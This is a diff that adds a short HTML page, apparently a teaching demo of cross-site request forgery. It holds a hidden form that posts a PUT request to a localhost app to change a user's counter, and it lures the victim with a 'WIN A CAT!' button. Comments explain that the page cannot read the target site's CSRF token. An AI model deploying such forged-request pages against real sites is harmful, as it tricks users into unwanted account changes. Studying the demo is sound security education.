@@ -1,0 +1,15 @@
+<!-- CROSS SITE REQUEST FORGERY -->
+<html>
+  <form action="http://localhost:3000/user/counter" method="POST">
+    <input type="hidden" name="_method" value="PUT">
+    <!-- sandboxing: hides good site's cookies from bad site -->
+    <input
+      type="hidden"
+      name="_my_csrf_token"
+      value="get the csrf token out of good site's cookie?">
+    
+    <input type="hidden" name="user[counter]" value="-1">
+    
+    <input type="submit" value="WIN A CAT!">
+  </form>
+</html>
